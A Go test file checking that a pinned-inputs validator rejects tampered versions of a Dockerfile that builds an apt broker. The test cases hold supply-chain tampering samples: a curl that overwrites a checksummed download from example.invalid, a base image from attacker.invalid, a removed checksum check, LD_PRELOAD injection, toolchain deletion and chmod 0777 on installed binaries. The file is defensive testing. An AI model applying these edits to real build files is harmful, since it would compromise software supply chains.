// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam

package metadatautil_test

import (
	"strings"
	"testing"

	"github.com/omkhar/workcell/internal/metadatautil"
)

func TestCheckPinnedInputsAcceptsAptBrokerBuildContract(t *testing.T) {
	cfg := writePinnedInputsFixture(t)
	if err := metadatautil.CheckPinnedInputs(cfg); err != nil {
		t.Fatalf("metadatautil.CheckPinnedInputs() error = %v", err)
	}
}

func TestCheckPinnedInputsRejectsAptBrokerGoPinDrift(t *testing.T) {
	for _, tc := range []struct {
		name string
		old  string
		new  string
		want string
	}{
		{
			name: "version",
			old:  "ARG GO_VERSION=",
			new:  "ARG GO_VERSION=0.0.0 # replaced ",
			want: "apt broker Go version",
		},
		{
			name: "amd64-digest",
			old:  "ARG GO_LINUX_X86_64_SHA256=",
			new:  "ARG GO_LINUX_X86_64_SHA256=deadbeef",
			want: "apt broker amd64 Go digest",
		},
		{
			name: "arm64-digest",
			old:  "ARG GO_LINUX_ARM64_SHA256=",
			new:  "ARG GO_LINUX_ARM64_SHA256=deadbeef",
			want: "apt broker arm64 Go digest",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			cfg := rewriteAptBrokerDockerfile(t, tc.old, tc.new)
			requirePinnedInputsErrorContains(t, cfg, tc.want)
		})
	}
}

func TestCheckPinnedInputsRejectsDuplicateAptBrokerGoPins(t *testing.T) {
	for _, name := range []string{"GO_VERSION", "GO_LINUX_X86_64_SHA256", "GO_LINUX_ARM64_SHA256"} {
		t.Run(name, func(t *testing.T) {
			cfg := rewriteAptBrokerDockerfileWith(t, func(content string) string {
				prefix := "ARG " + name + "="
				start := strings.Index(content, prefix)
				if start < 0 {
					t.Fatalf("runtime Dockerfile does not contain %q", prefix)
				}
				end := strings.IndexByte(content[start:], '\n')
				if end < 0 {
					t.Fatalf("runtime Dockerfile %q declaration has no line ending", name)
				}
				end += start + 1
				return content[:end] + "arg " + name + "=attacker-value\n" + content[end:]
			})
			requirePinnedInputsErrorContains(t, cfg, "must match the reviewed canonical stage")
		})
	}
}

func TestCheckPinnedInputsRejectsAptBrokerBuildContractDrift(t *testing.T) {
	for _, tc := range []struct {
		name string
		old  string
		new  string
		want string
	}{
		{
			name: "duplicate-stage",
			old:  "FROM --platform=$BUILDPLATFORM ${NODE_BASE_IMAGE} AS apt-broker-builder\n",
			new:  "FROM --platform=$BUILDPLATFORM ${NODE_BASE_IMAGE} AS apt-broker-builder\nFROM --platform=$BUILDPLATFORM ${NODE_BASE_IMAGE} AS apt-broker-builder\n",
			want: "Docker stage alias apt-broker-builder",
		},
		{
			name: "target-platform-builder",
			old:  "FROM --platform=$BUILDPLATFORM ${NODE_BASE_IMAGE} AS apt-broker-builder",
			new:  "FROM --platform=$TARGETPLATFORM ${NODE_BASE_IMAGE} AS apt-broker-builder",
			want: "apt broker builder stage",
		},
		{
			name: "duplicate-builder-alias",
			old:  "FROM runtime-base AS provider-builder\n",
			new:  "FROM runtime-base AS provider-builder\nFROM attacker.invalid/image AS apt-broker-builder\n",
			want: "Docker stage alias apt-broker-builder",
		},
		{
			name: "architecture-digest",
			old:  `arm64) GO_SHA256="${GO_LINUX_ARM64_SHA256}" ;;`,
			new:  `arm64) GO_SHA256="${GO_LINUX_X86_64_SHA256}" ;;`,
			want: "must match the reviewed canonical stage",
		},
		{
			name: "download-origin",
			old:  "https://dl.google.com/go/go${GO_VERSION}.linux-${BUILDARCH}.tar.gz",
			new:  "https://example.invalid/go/go${GO_VERSION}.linux-${TARGETARCH}.tar.gz",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "target-architecture-download",
			old:  "linux-${BUILDARCH}.tar.gz",
			new:  "linux-${TARGETARCH}.tar.gz",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "checksum",
			old:  `echo "${GO_SHA256}  /tmp/go.tar.gz" | sha256sum -c -`,
			new:  `echo "downloaded /tmp/go.tar.gz"`,
			want: "must match the reviewed canonical stage",
		},
		{
			name: "overwrite-after-checksum",
			old:  `&& echo "${GO_SHA256}  /tmp/go.tar.gz" | sha256sum -c - \`,
			new:  "&& echo \"${GO_SHA256}  /tmp/go.tar.gz\" | sha256sum -c - \\\n  && curl --ipv4 -fsSL https://example.invalid/go.tar.gz -o /tmp/go.tar.gz \\",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "module-copy-mode",
			old:  "COPY --chmod=0444 go.mod go.sum ./",
			new:  "COPY go.mod go.sum ./",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "trusted-ca-copy",
			old:  "COPY --from=runtime-base --chmod=0444 /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/ca-certificates.crt",
			new:  "COPY /tmp/ca-certificates.crt /etc/ssl/certs/ca-certificates.crt",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "broker-source-copy",
			old:  "COPY --chmod=0555 internal/aptbroker ./internal/aptbroker",
			new:  "COPY internal/aptbroker ./internal/aptbroker",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "client-source-copy",
			old:  "COPY --chmod=0555 cmd/workcell-apt-broker-client ./cmd/workcell-apt-broker-client",
			new:  "COPY cmd/workcell-apt-broker-client ./cmd/workcell-apt-broker-client",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "server-source-copy",
			old:  "COPY --chmod=0555 cmd/workcell-apt-broker-server ./cmd/workcell-apt-broker-server",
			new:  "COPY cmd/workcell-apt-broker-server ./cmd/workcell-apt-broker-server",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "network-toolchain",
			old:  "ENV GOTOOLCHAIN=local",
			new:  "ENV GOTOOLCHAIN=auto",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "static-build",
			old:  "ENV CGO_ENABLED=0",
			new:  "ENV CGO_ENABLED=1",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "reproducible-build-flags",
			old:  "-mod=readonly -trimpath -buildvcs=false -ldflags='-buildid='",
			new:  "-mod=readonly -buildvcs=false",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "command-local-build-override",
			old:  `RUN GOOS=linux GOARCH="${TARGETARCH}" /usr/local/go/bin/go build`,
			new:  `RUN GOTOOLCHAIN=auto CGO_ENABLED=1 GOOS=linux GOARCH="${TARGETARCH}" /usr/local/go/bin/go build`,
			want: "must match the reviewed canonical stage",
		},
		{
			name: "host-operating-system-build",
			old:  "RUN GOOS=linux",
			new:  "RUN GOOS=darwin",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "build-architecture-target",
			old:  `GOARCH="${TARGETARCH}"`,
			new:  `GOARCH="${BUILDARCH}"`,
			want: "must match the reviewed canonical stage",
		},
		{
			name: "missing-source-date-epoch-argument",
			old:  "ARG TARGETARCH\nARG SOURCE_DATE_EPOCH\n\nSHELL",
			new:  "ARG TARGETARCH\n\nSHELL",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "normalized-output-time",
			old:  `touch -d "@${SOURCE_DATE_EPOCH}" /out/workcell-apt-broker-client /out/workcell-apt-broker-server`,
			new:  "true",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "preload",
			old:  "ENV CGO_ENABLED=0",
			new:  "ENV CGO_ENABLED=0\nENV LD_PRELOAD=/usr/local/lib/libworkcell_exec_guard.so",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "environment-override",
			old:  "ENV GOTOOLCHAIN=local",
			new:  "ENV GOTOOLCHAIN=local\nenv GOTOOLCHAIN auto",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "multi-assignment-environment-override",
			old:  "ENV GOTOOLCHAIN=local",
			new:  "ENV GOTOOLCHAIN=local\nENV ATTACKER_MARKER=x GOTOOLCHAIN=auto",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "toolchain-replacement-instruction",
			old:  "ENV GOTOOLCHAIN=local",
			new:  "RUN rm -rf /usr/local/go && mkdir -p /usr/local/go\n\nENV GOTOOLCHAIN=local",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "post-build-output-mutation",
			old:  `touch -d "@${SOURCE_DATE_EPOCH}" /out/workcell-apt-broker-client /out/workcell-apt-broker-server`,
			new:  "touch -d \"@${SOURCE_DATE_EPOCH}\" /out/workcell-apt-broker-client /out/workcell-apt-broker-server\nRUN printf replaced > /out/workcell-apt-broker-client",
			want: "must match the reviewed canonical stage",
		},
		{
			name: "runtime-install-mode",
			old:  "COPY --from=apt-broker-builder --chown=0:0 --chmod=0555",
			new:  "COPY --from=apt-broker-builder --chown=65532:65532 --chmod=0755",
			want: "apt broker runtime install boundary",
		},
		{
			name: "runtime-install-override",
			old:  "COPY --from=apt-broker-builder --chown=0:0 --chmod=0555 /out/workcell-apt-broker-client /out/workcell-apt-broker-server /usr/local/libexec/workcell/",
			new:  "COPY --from=apt-broker-builder --chown=0:0 --chmod=0555 /out/workcell-apt-broker-client /out/workcell-apt-broker-server /usr/local/libexec/workcell/\nRUN chmod 0777 /usr/local/libexec/workcell/workcell-apt-broker-client",
			want: "apt broker runtime install boundary",
		},
		{
			name: "post-install-directory-mutation",
			old:  "WORKDIR /workspace\n\nENV HOME",
			new:  "WORKDIR /workspace\nRUN chmod -R 0777 /usr/local/libexec/workcell\n\nENV HOME",
			want: "must not mutate the filesystem after the apt broker runtime install",
		},
		{
			name: "appended-final-stage",
			old:  `ENTRYPOINT ["/usr/local/bin/workcell-entrypoint"]`,
			new:  "ENTRYPOINT [\"/usr/local/bin/workcell-entrypoint\"]\n\n  FROM runtime-base AS alternate-final",
			want: "final runtime stage must be the last Docker stage",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			cfg := rewriteAptBrokerDockerfile(t, tc.old, tc.new)
			requirePinnedInputsErrorContains(t, cfg, tc.want)
		})
	}
}

func rewriteAptBrokerDockerfile(t testing.TB, old, replacement string) metadatautil.PinnedInputsConfig {
	t.Helper()
	return rewriteAptBrokerDockerfileWith(t, func(content string) string {
		if !strings.Contains(content, old) {
			t.Fatalf("runtime Dockerfile does not contain %q", old)
		}
		return strings.Replace(content, old, replacement, 1)
	})
}

func rewriteAptBrokerDockerfileWith(t testing.TB, rewrite func(string) string) metadatautil.PinnedInputsConfig {
	t.Helper()
	return rewritePinnedInputsFixtureFile(t, "runtime/container/Dockerfile", rewrite)
}
